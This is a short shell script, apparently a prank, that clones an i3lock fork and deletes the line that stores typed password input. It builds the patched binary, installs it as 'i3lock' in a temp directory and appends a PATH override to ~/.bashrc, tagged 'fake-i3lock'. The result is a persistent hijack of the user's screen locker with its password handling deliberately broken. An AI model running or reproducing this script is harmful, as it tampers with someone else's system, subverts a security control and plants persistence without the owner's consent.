#!/bin/sh

tempdir=$(mktemp -d)
cd "$tempdir"
git clone https://github.com/ItzaPhenix/epi3lock
cd epi3lock
sed -i "s/^int input_position;$/extern int input_position;/" unlock_indicator.c
sed -i "s/^.*memcpy(password + input_position.*$//" i3lock.c
make all
cp epi3lock ../i3lock
cd ..

echo "export PATH=\"$tempdir:$PATH\"; # confloose by leo [fake-i3lock]" >> "$HOME/.bashrc"
export PATH="$tempdir:$PATH"
